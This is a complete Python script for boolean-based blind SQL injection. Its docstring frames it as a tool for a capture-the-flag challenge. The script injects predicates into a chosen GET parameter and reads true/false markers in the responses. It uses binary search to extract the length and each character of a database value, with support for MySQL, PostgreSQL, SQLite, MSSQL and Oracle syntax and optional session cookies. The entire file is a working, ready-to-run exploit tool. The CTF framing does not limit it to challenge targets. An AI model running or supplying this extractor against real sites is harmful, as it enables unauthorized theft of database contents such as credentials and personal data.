#!/usr/bin/env python3
"""Sequential boolean SQLi extractor for an already-confirmed CTF GET oracle.

No scanner or engine detection. You supply engine, exact SQL scalar expression,
injection template and disjoint true/false response markers. ASCII text only.
"""

import argparse
import math
import sys
import time
from urllib.error import HTTPError, URLError
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit
from urllib.request import Request, urlopen


class OracleError(RuntimeError):
    pass


def predicates(engine, expression):
    length = "LEN" if engine == "mssql" else "LENGTH"
    substring = "SUBSTR" if engine in ("sqlite", "oracle") else "SUBSTRING"
    code = "UNICODE" if engine == "sqlite" else "ASCII"
    return (f"{length}(({expression}))",
            lambda position: f"{code}({substring}(({expression}),{position},1))")


class Oracle:
    def __init__(self, args):
        self.args = args
        self.requests = 0

    def query(self, predicate):
        if self.requests >= self.args.max_requests:
            raise OracleError("request budget exhausted; result incomplete")
        self.requests += 1
        payload = self.args.template.replace("{predicate}", predicate)
        parts = urlsplit(self.args.url)
        fields = [(key, value) for key, value in parse_qsl(parts.query, keep_blank_values=True)
                  if key != self.args.parameter]
        fields.append((self.args.parameter, payload))
        url = urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(fields), ""))
        headers = {"User-Agent": "offline-ctf-reference/1.0"}
        if self.args.cookie:
            headers["Cookie"] = self.args.cookie
        request = Request(url, headers=headers)
        try:
            with urlopen(request, timeout=self.args.timeout) as response:
                if not 200 <= response.status < 300:
                    raise OracleError(f"unexpected HTTP {response.status}")
                body = response.read(4 * 1024 * 1024 + 1)
                if len(body) > 4 * 1024 * 1024:
                    raise OracleError("response exceeds 4 MiB; cannot classify safely")
        except HTTPError as exc:
            raise OracleError(f"HTTP {exc.code}, not classified as false") from exc
        except (URLError, TimeoutError, OSError) as exc:
            raise OracleError(f"transport failure, not classified as false: {exc}") from exc
        finally:
            time.sleep(self.args.interval)
        true = self.args.true_marker.encode() in body
        false = self.args.false_marker.encode() in body
        if true == false:
            raise OracleError("ambiguous response: both markers present or neither present")
        return true


def recover(query, engine, expression, max_length, low=32, high=126):
    length_expr, char_expr = predicates(engine, expression)
    if not query("1=1") or query("1=2"):
        raise OracleError("true/false control failed; repair the oracle first")
    if not query(f"({expression}) IS NOT NULL"):
        raise OracleError("target expression is NULL / no row; enumerate and select a row first")
    if query(f"{length_expr}>{max_length}"):
        raise OracleError("value longer than --max-length; increase explicitly")
    left, right = 0, max_length
    while left < right:
        middle = (left + right) // 2
        if query(f"{length_expr}>{middle}"):
            left = middle + 1
        else:
            right = middle
    length = left
    if not query(f"{length_expr}={length}"):
        raise OracleError("length equality verification failed")
    result = []
    for position in range(1, length + 1):
        char = char_expr(position)
        if not query(f"{char}>={low} AND {char}<={high}"):
            raise OracleError(f"position {position} outside allowed ASCII range or oracle unstable")
        left, right = low, high
        while left < right:
            middle = (left + right) // 2
            if query(f"{char}>{middle}"):
                left = middle + 1
            else:
                right = middle
        if not query(f"{char}={left}"):
            raise OracleError(f"character {position} equality verification failed")
        result.append(chr(left))
        print(f"[{position}/{length}] {''.join(result)!r}", file=sys.stderr)
    # Recheck each code point: avoids case-insensitive collation equality surprises.
    for position, value in enumerate(result, 1):
        if not query(f"{char_expr(position)}={ord(value)}"):
            raise OracleError("final character verification failed; data/oracle changed")
    if not query(f"{length_expr}={length}"):
        raise OracleError("final length verification failed")
    return "".join(result)


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", required=True, help="challenge endpoint, including stable other query params")
    parser.add_argument("--parameter", required=True, help="GET parameter to replace")
    parser.add_argument("--template", required=True, help="e.g. 1 AND ({predicate}); include correct closure")
    parser.add_argument("--engine", required=True, choices=("mysql", "postgresql", "sqlite", "mssql", "oracle"))
    parser.add_argument("--expression", required=True, help="scalar SQL expression, including row-limiting subquery")
    parser.add_argument("--true-marker", required=True)
    parser.add_argument("--false-marker", required=True)
    parser.add_argument("--cookie", help="session Cookie header for the authorized challenge")
    parser.add_argument("--max-length", type=int, default=128)
    parser.add_argument("--max-requests", type=int, default=2000)
    parser.add_argument("--timeout", type=float, default=10)
    parser.add_argument("--interval", type=float, default=0.1)
    args = parser.parse_args()
    parts = urlsplit(args.url)
    if parts.scheme not in ("http", "https") or not parts.hostname:
        parser.error("--url must be an http(s) endpoint")
    if args.template.count("{predicate}") != 1:
        parser.error("--template needs exactly one {predicate} placeholder")
    if not args.true_marker or not args.false_marker or args.true_marker == args.false_marker:
        parser.error("provide distinct nonempty response markers")
    if (args.max_length < 0 or args.max_requests < 1
            or not math.isfinite(args.timeout) or args.timeout <= 0
            or not math.isfinite(args.interval) or args.interval < 0):
        parser.error("invalid length/budget/timeout/interval")
    oracle = Oracle(args)
    try:
        result = recover(oracle.query, args.engine, args.expression, args.max_length)
    except OracleError as exc:
        parser.exit(2, f"incomplete after {oracle.requests} requests: {exc}\n")
    print(result)
    print(f"verified using {oracle.requests} requests", file=sys.stderr)


if __name__ == "__main__":
    main()
